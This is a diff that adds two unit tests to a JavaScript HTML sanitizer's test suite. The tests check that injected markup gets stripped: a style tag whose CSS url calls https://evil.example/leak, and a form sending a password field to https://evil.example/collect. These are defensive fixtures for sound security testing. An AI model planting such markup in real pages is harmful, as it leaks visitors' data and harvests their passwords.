@@ -20,4 +20,14 @@ describe('sanitizeHtml', () => {
         const safe = '<p class="embed">Article body</p>';
         expect(sanitizeHtml(safe)).toBe('<p class="embed">Article body</p>');
     });
+
+    it('strips style tags to prevent CSS-based exfiltration/UI redress', () => {
+        const malicious = '<p>Hello</p><style>body { background: url("https://evil.example/leak") }</style>';
+        expect(sanitizeHtml(malicious)).toBe('<p>Hello</p>');
+    });
+
+    it('strips form tags to prevent phishing forms in article content', () => {
+        const malicious = '<p>Hello</p><form action="https://evil.example/collect"><input name="password"></form>';
+        expect(sanitizeHtml(malicious)).toBe('<p>Hello</p>');
+    });
 });
